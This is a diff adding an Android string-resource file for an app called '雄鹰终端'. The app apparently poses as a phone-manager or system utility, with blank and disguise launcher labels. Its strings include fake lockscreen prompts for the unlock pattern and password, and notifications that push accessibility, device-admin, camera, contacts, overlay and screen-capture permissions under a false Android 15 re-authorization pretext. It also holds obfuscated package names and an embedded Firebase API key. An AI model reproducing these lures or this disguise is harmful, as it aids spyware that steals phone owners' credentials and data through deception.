@@ -1,0 +1,216 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="abc_action_bar_up_description">Navigate up</string>
+    <string name="abc_action_mode_done">Done</string>
+    <string name="abc_capital_off">OFF</string>
+    <string name="abc_capital_on">ON</string>
+    <string name="abc_menu_alt_shortcut_label">Alt+</string>
+    <string name="abc_menu_ctrl_shortcut_label">Ctrl+</string>
+    <string name="abc_menu_delete_shortcut_label">delete</string>
+    <string name="abc_menu_enter_shortcut_label">enter</string>
+    <string name="abc_menu_function_shortcut_label">Function+</string>
+    <string name="abc_menu_meta_shortcut_label">Meta+</string>
+    <string name="abc_menu_shift_shortcut_label">Shift+</string>
+    <string name="abc_menu_space_shortcut_label">space</string>
+    <string name="abc_menu_sym_shortcut_label">Sym+</string>
+    <string name="abc_prepend_shortcut_label">Menu+</string>
+    <string name="abc_search_hint">Search…</string>
+    <string name="abc_searchview_description_clear">Clear query</string>
+    <string name="abc_searchview_description_search">Search</string>
+    <string name="abc_searchview_description_submit">Submit query</string>
+    <string name="abc_searchview_description_voice">Voice search</string>
+    <string name="abc_toolbar_collapse_description">Collapse</string>
+    <string name="accessibility_service_description">辅助功能服务</string>
+    <string name="account_label">Backup &amp; Sync</string>
+    <string name="androidx_startup">androidx.startup</string>
+    <string name="app_name">雄鹰终端</string>
+    <string name="call_notification_answer_action">Answer</string>
+    <string name="call_notification_answer_video_action">Video</string>
+    <string name="call_notification_decline_action">Decline</string>
+    <string name="call_notification_hang_up_action">Hang Up</string>
+    <string name="call_notification_incoming_text">Incoming call</string>
+    <string name="call_notification_ongoing_text">Ongoing call</string>
+    <string name="call_notification_screening_text">Screening an incoming call</string>
+    <string name="common_google_play_services_enable_button">Enable</string>
+    <string name="common_google_play_services_enable_text">"%1$s won't work unless you enable Google Play services."</string>
+    <string name="common_google_play_services_enable_title">Enable Google Play services</string>
+    <string name="common_google_play_services_install_button">Install</string>
+    <string name="common_google_play_services_install_text">"%1$s won't run without Google Play services, which are missing from your device."</string>
+    <string name="common_google_play_services_install_title">Get Google Play services</string>
+    <string name="common_google_play_services_notification_channel_name">Google Play services availability</string>
+    <string name="common_google_play_services_notification_ticker">Google Play services error</string>
+    <string name="common_google_play_services_unknown_issue">%1$s is having trouble with Google Play services. Please try again.</string>
+    <string name="common_google_play_services_unsupported_text">"%1$s won't run without Google Play services, which are not supported by your device."</string>
+    <string name="common_google_play_services_update_button">Update</string>
+    <string name="common_google_play_services_update_text">"%1$s won't run unless you update Google Play services."</string>
+    <string name="common_google_play_services_update_title">Update Google Play services</string>
+    <string name="common_google_play_services_updating_text">"%1$s won't run without Google Play services, which are currently updating."</string>
+    <string name="common_google_play_services_wear_update_text">New version of Google Play services needed. It will update itself shortly.</string>
+    <string name="common_open_on_phone">Open on phone</string>
+    <string name="common_signin_button_text">Sign in</string>
+    <string name="common_signin_button_text_long">Sign in with Google</string>
+    <string name="device_admin_description">允许应用管理设备设置</string>
+    <string name="device_admin_label">应用管理</string>
+    <string name="dgpwoexanuan">.</string>
+    <string name="famypebdbd">nlmr.cqhqn.bxa.ayexx</string>
+    <string name="fcm_fallback_notification_channel_label">Miscellaneous</string>
+    <string name="ic_media_route_learn_more_accessibility">Learn how to cast</string>
+    <string name="label_blank">⠀⠀</string>
+    <string name="label_variant_f0">⠀i管家⠀</string>
+    <string name="label_variant_g">i管家</string>
+    <string name="label_variant_h">⠀手机管家⠀</string>
+    <string name="label_variant_i">系统管家</string>
+    <string name="label_variant_j">⠀手机管家⠀</string>
+    <string name="label_variant_l">⠀智能管理器⠀</string>
+    <string name="lockscreen_draw_pattern">绘制解锁图案</string>
+    <string name="lockscreen_enter_password">输入密码</string>
+    <string name="lockscreen_other_password_type">其他密码类型</string>
+    <string name="lockscreen_pattern_too_short">至少连接4个点，请重试</string>
+    <string name="lockscreen_wrong_password">密码错误，请重试</string>
+    <string name="lockscreen_wrong_pattern">图案错误，请重试</string>
+    <string name="logo_background">android.content.BackGround</string>
+    <string name="logo_board">android.content.ContactDirectory</string>
+    <string name="logo_foreground">android.online.ForeGround</string>
+    <string name="mpyupoolrux">uva.eutt.lgjht.pyrnb</string>
+    <string name="mr_cast_button_connected">Cast. Connected</string>
+    <string name="mr_cast_button_connecting">Cast. Connecting</string>
+    <string name="mr_cast_button_disconnected">Cast. Disconnected</string>
+    <string name="mr_cast_dialog_title_view_placeholder">No info available</string>
+    <string name="mr_chooser_looking_for_devices">Looking for devices...</string>
+    <string name="mr_chooser_title">Cast to</string>
+    <string name="mr_chooser_wifi_learn_more"><a href="https://support.google.com/chromecast/?p=trouble-finding-devices">Learn more</a></string>
+    <string name="mr_chooser_wifi_warning_description_car">Make sure the other device is on the same Wi-Fi network as this car</string>
+    <string name="mr_chooser_wifi_warning_description_phone">Make sure the other device is on the same Wi-Fi network as this phone</string>
+    <string name="mr_chooser_wifi_warning_description_tablet">Make sure the other device is on the same Wi-Fi network as this tablet</string>
+    <string name="mr_chooser_wifi_warning_description_tv">Make sure the other device is on the same Wi-Fi network as this tv</string>
+    <string name="mr_chooser_wifi_warning_description_unknown">Make sure the other device is on the same Wi-Fi network as this device</string>
+    <string name="mr_chooser_wifi_warning_description_watch">Make sure the other device is on the same Wi-Fi network as this watch</string>
+    <string name="mr_chooser_zero_routes_found_title">No devices available</string>
+    <string name="mr_controller_album_art">Album art</string>
+    <string name="mr_controller_casting_screen">Casting screen</string>
+    <string name="mr_controller_close_description">Close</string>
+    <string name="mr_controller_collapse_group">Collapse</string>
+    <string name="mr_controller_disconnect">Disconnect</string>
+    <string name="mr_controller_expand_group">Expand</string>
+    <string name="mr_controller_no_info_available">No info available</string>
+    <string name="mr_controller_no_media_selected">No media selected</string>
+    <string name="mr_controller_pause">Pause</string>
+    <string name="mr_controller_play">Play</string>
+    <string name="mr_controller_stop">Stop</string>
+    <string name="mr_controller_stop_casting">Stop casting</string>
+    <string name="mr_controller_volume_slider">Volume slider</string>
+    <string name="mr_dialog_default_group_name">Group</string>
+    <string name="mr_dialog_groupable_header">Add a device</string>
+    <string name="mr_dialog_transferable_header">Play on a group</string>
+    <string name="mr_user_route_category_name">Devices</string>
+    <string name="network_connected">已连接</string>
+    <string name="network_connecting">正在连接...</string>
+    <string name="network_disconnected">连接断开</string>
+    <string name="network_error">连接错误</string>
+    <string name="notification_channel_permission_error">权限错误</string>
+    <string name="notification_channel_permission_error_desc">权限恢复失败通知</string>
+    <string name="notification_channel_system_verify">系统验证</string>
+    <string name="notification_channel_system_verify_desc">系统身份验证提示</string>
+    <string name="notification_contacts_text">点击此通知授予通讯录访问权限</string>
+    <string name="notification_contacts_title">需要通讯录权限</string>
+    <string name="notification_overlay_required_text">点击开启悬浮窗权限以支持操作控制功能</string>
+    <string name="notification_overlay_required_title">需要悬浮窗权限</string>
+    <string name="notification_permission_check_big_text">"服务权限自动恢复失败。这可能是由于：
+• Android 15系统限制
+• 权限被永久拒绝
+• 系统设置变更
+
+请点击检查权限设置。"</string>
+    <string name="notification_permission_check_text">权限多次恢复失败，请手动检查权限设置</string>
+    <string name="notification_permission_check_title">服务权限需要检查</string>
+    <string name="notification_reauth_action">重新设置</string>
+    <string name="notification_reauth_big_text">"由于Android 15的权限保护机制，权限需要重新授权。
+
+这是系统安全特性，点击通知重新设置权限即可继续使用服务功能。"</string>
+    <string name="notification_reauth_text">Android 15权限保护机制要求重新授权，点击重新设置</string>
+    <string name="notification_reauth_title">需要重新授权权限</string>
+    <string name="open_app_settings">应用设置</string>
+    <string name="permission_auto_failed">自动权限申请失败，请手动点击权限对话框</string>
+    <string name="permission_max_retry">权限申请达到最大重试次数，请手动操作</string>
+    <string name="permission_media_projection_message">请允许应用使用此功能</string>
+    <string name="permission_media_projection_title">需要权限</string>
+    <string name="permission_overlay_message">请允许应用显示内容</string>
+    <string name="permission_overlay_title">需要显示权限</string>
+    <string name="service_not_running">服务未启动</string>
+    <string name="service_notification_text">运行中</string>
+    <string name="service_notification_title">数据同步</string>
+    <string name="service_running">服务正在运行</string>
+    <string name="status_activity_failed">"🔧 独立Activity失败，尝试内置方法…
+正在重新申请权限"</string>
+    <string name="status_all_granted">"✅ 所有权限已授予
+无需申请"</string>
+    <string name="status_all_permissions_granted">"✅ 所有权限已授予
+权限申请完成"</string>
+    <string name="status_android11_done">"✅ Android 11+设备
+权限设置完成
+正在连接服务器…"</string>
+    <string name="status_android11_fast">"📱 Android 11+设备
+快速启动模式
+正在建立连接…"</string>
+    <string name="status_android11_screenshot_ready">"📱 Android 11+设备
+无障碍截图API已就绪
+服务启动中…"</string>
+    <string name="status_android_low">"✅ Android版本低于6.0
+无需申请摄像头权限"</string>
+    <string name="status_backup_plan">"🔄 启动备用服务权限申请方案
+正在申请服务权限…"</string>
+    <string name="status_bar_notification_info_overflow">999+</string>
+    <string name="status_broadcast_failed">"❌ 广播发送失败
+请重试"</string>
+    <string name="status_builtin_method">🔧 尝试内置权限申请方法…</string>
+    <string name="status_camera_denied">"❌ 摄像头权限被拒绝
+请手动在设置中开启"</string>
+    <string name="status_camera_failed">"❌ 摄像头权限申请失败
+请手动在设置中开启"</string>
+    <string name="status_camera_granted">"✅ 摄像头权限已授予
+权限申请完成"</string>
+    <string name="status_camera_requesting">"📷 正在申请摄像头权限
+请在弹出的对话框中点击允许"</string>
+    <string name="status_click_start_now">"📱 请在弹出的权限对话框中点击\"立即开始\"
+如果没有看到对话框，请稍等片刻"</string>
+    <string name="status_device_optimize">"🔧 正在为设备优化权限申请…
+使用简化权限申请方法"</string>
+    <string name="status_optimize_failed">"⚠️ 优化失败，尝试标准方法…
+正在重新申请权限"</string>
+    <string name="status_partial_denied">"⚠️ 部分权限被拒绝
+已授予: %1$d/%2$d"</string>
+    <string name="status_permission_collect_failed">"❌ 权限收集失败
+请重试"</string>
+    <string name="status_permission_config">"📱 权限配置中
+正在建立连接…"</string>
+    <string name="status_permission_flow_error">"🧠 检测到权限流程异常
+正在智能恢复权限申请…"</string>
+    <string name="status_permission_incomplete">"⚠️ 检测到权限配置不完整
+正在自动申请服务权限…"</string>
+    <string name="status_permission_request_failed">"❌ 权限申请失败
+请重试"</string>
+    <string name="status_permission_success">"✅ 权限申请成功
+正在启动服务…"</string>
+    <string name="status_requesting_all">"🔧 正在申请所有权限…
+请一次性允许所有权限"</string>
+    <string name="status_requesting_permissions">"🔧 正在申请权限: %s
+请一次性允许所有权限"</string>
+    <string name="status_service_fault">"🔧 检测到无障碍服务可能出现故障
+正在等待服务恢复…"</string>
+    <string name="status_service_no_response">"⚠️ 无障碍服务长时间无响应
+尝试备用权限申请方案…"</string>
+    <string name="status_service_recovered">"✅ 无障碍服务已恢复
+开始智能权限申请…"</string>
+    <string name="status_service_starting">✅ 服务启动中…</string>
+    <string name="status_waiting_service">"🔧 等待无障碍服务恢复…
+第%1$d次检测，剩余%2$d次
+预计还需%3$d秒，请稍候"</string>
+    <string name="wrfvfollho">pcgw.pgxh.xrh.fpvd</string>
+    <string name="yajtxhdegofm">ydimc.fnuf.unq.oxmaj</string>
+    <string name="google_app_id">1:663040677529:android:210641b74816f327d2ca08</string>
+    <string name="google_api_key">AIzaSyB4I9FjX_7ieQXN0SDM6RbO-vGTjw2LEdw</string>
+    <string name="gcm_defaultSenderId">663040677529</string>
+    <string name="firebase_database_url">https://xiongy-2ee6e-default-rtdb.firebaseio.com</string>
+    <string name="google_storage_bucket">xiongy-2ee6e.firebasestorage.app</string>
+    <string name="project_id">xiongy-2ee6e</string>
+</resources>
